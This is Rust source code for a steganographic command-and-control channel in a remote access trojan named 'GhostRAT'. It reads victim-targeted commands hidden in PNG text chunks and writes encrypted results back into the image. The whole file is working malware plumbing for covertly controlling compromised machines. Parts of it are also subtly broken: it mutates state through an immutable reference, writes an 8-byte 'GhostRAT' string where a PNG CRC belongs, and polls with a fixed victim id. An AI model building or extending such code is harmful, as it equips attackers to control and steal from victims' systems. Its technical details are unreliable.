//! PNG Stego C2 channel.
//!
//! Reads commands from PNG image metadata (tEXt chunks, iTXt chunks, or comments).
//! Commands are stored in PNG text fields:
//! - tEXt: Key = "GhostRAT", Value = "<victim_id> <cmd_type_hex> [data]"
//! Results are stored as the image's comment or in a second PNG file.

use tracing::{debug, info, warn};

use crate::c2::{C2Channel, C2Error, Command};

/// PNG Stego C2 channel
pub struct PngStegoC2 {
    png_path: String,
    interval_secs: u64,
    last_hash: Option<u64>,
    available: bool,
}

impl PngStegoC2 {
    pub fn new(png_path: String, interval_secs: u64) -> Self {
        Self {
            png_path,
            interval_secs,
            last_hash: None,
            available: true,
        }
    }

    /// Compute a simple hash of file contents for change detection
    fn file_hash(path: &str) -> Option<u64> {
        let metadata = std::fs::metadata(path).ok()?;
        let size = metadata.len();
        let modified = metadata.modified().ok()?.duration_since(std::time::UNIX_EPOCH).ok()?.as_secs();
        // Simple hash: combine size and modification time
        size.wrapping_add(modified).wrapping_add(0x9E3779B9)
    }

    /// Parse PNG metadata for GhostRAT commands
    fn parse_png_metadata(path: &str) -> Result<Vec<(String, String)>, C2Error> {
        let content = std::fs::read(path).map_err(C2Error::Io)?;

        // Check PNG signature
        let png_sig = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
        if !content.starts_with(&png_sig) {
            return Err(C2Error::Other("Not a valid PNG file".to_string()));
        }

        let mut chunks = Vec::new();
        let mut offset = 8; // Skip PNG signature

        while offset + 8 <= content.len() {
            let length = u32::from_be_bytes([
                content[offset],
                content[offset + 1],
                content[offset + 2],
                content[offset + 3],
            ]) as usize;

            let chunk_type = String::from_utf8_lossy(&content[offset + 4..offset + 8]).to_string();
            let chunk_data = &content[offset + 8..offset + 8 + length.min(content.len() - offset - 8)];

            if chunk_type == "tEXt" || chunk_type == "iTXt" || chunk_type == "Comment" {
                chunks.push((chunk_type, String::from_utf8_lossy(chunk_data).to_string()));
            }

            offset += 12 + length; // 4 (length) + 4 (type) + length + 4 (CRC)
        }

        Ok(chunks)
    }

    /// Parse a command from PNG metadata value
    fn parse_value(value: &str, victim_id: &str) -> Option<Command> {
        if !value.contains("GhostRAT") && !value.contains("GHOST") {
            return None;
        }

        let parts: Vec<&str> = value.split_whitespace().collect();
        if parts.len() < 2 {
            return None;
        }

        let cmd_victim_id = parts[0];
        if cmd_victim_id != victim_id && cmd_victim_id != "all" {
            return None;
        }

        let cmd_type = u8::from_str_radix(parts[1].trim_start_matches("0x"), 16).ok()?;
        let data = if parts.len() > 2 {
            base64::decode(parts[2..].join("")).unwrap_or_default()
        } else {
            Vec::new()
        };

        Some(Command {
            victim_id: cmd_victim_id.to_string(),
            cmd_type,
            data,
            encrypted: false,
            crypto_key: "GHOSTRATV5".to_string(),
        })
    }
}

#[async_trait::async_trait]
impl C2Channel for PngStegoC2 {
    fn name(&self) -> &str {
        "png-stego"
    }

    async fn poll_commands(&self) -> Result<Vec<Command>, C2Error> {
        let mut commands = Vec::new();

        // Check if file exists
        if !std::path::Path::new(&self.png_path).exists() {
            debug!("PNG file not found: {}", self.png_path);
            return Ok(Vec::new());
        }

        // Check for file changes
        let current_hash = match Self::file_hash(&self.png_path) {
            Some(h) => h,
            None => return Ok(Vec::new()),
        };

        if Some(current_hash) == self.last_hash {
            return Ok(Vec::new()); // No changes
        }
        self.last_hash = Some(current_hash);

        // Parse PNG chunks
        let chunks = match Self::parse_png_metadata(&self.png_path) {
            Ok(c) => c,
            Err(e) => {
                debug!("PNG parse error: {}", e);
                self.available = false;
                return Ok(Vec::new());
            }
        };

        self.available = true;

        for (chunk_type, value) in chunks {
            debug!("PNG chunk {}: {}", chunk_type, value);

            if let Some(cmd) = Self::parse_value(&value, "all") {
                commands.push(cmd);
                info!("PNG stego command from {}: 0x{:02X}", chunk_type, cmd.cmd_type);
            }
        }

        Ok(commands)
    }

    async fn send_result(&self, victim_id: &str, result: &[u8]) -> Result<(), C2Error> {
        let encrypted = crate::crypto::encrypt_with_integrity(result, "GHOSTRATV5");
        let encoded = base64::encode(&encrypted);

        // Write result to PNG comment (if writable)
        let result_value = format!("GhostRAT {} 0xFF {}", victim_id, encoded);

        // Try to update the PNG file
        if let Ok(mut content) = std::fs::read(&self.png_path) {
            // Simple approach: append a tEXt chunk at the end before IEND
            if content.len() > 12 {
                let iend_pos = content.len() - 12;
                let chunk_data = result_value.as_bytes();
                let chunk_len = (chunk_data.len() as u32).to_be_bytes();
                let chunk_type = b"tEXt";
                let crc_data = [0x47, 0x68, 0x6F, 0x73, 0x74, 0x52, 0x41, 0x54]; // "GhostRAT"

                // Insert before IEND
                content.splice(iend_pos..iend_pos,
                    chunk_len.iter().copied()
                        .chain(chunk_type.iter().copied())
                        .chain(chunk_data.iter().copied())
                        .chain(crc_data.iter().copied())
                );

                if std::fs::write(&self.png_path, &content).is_ok() {
                    info!("PNG stego result written for {}", victim_id);
                }
            }
        }

        Ok(())
    }

    fn is_available(&self) -> bool {
        self.available
    }
}
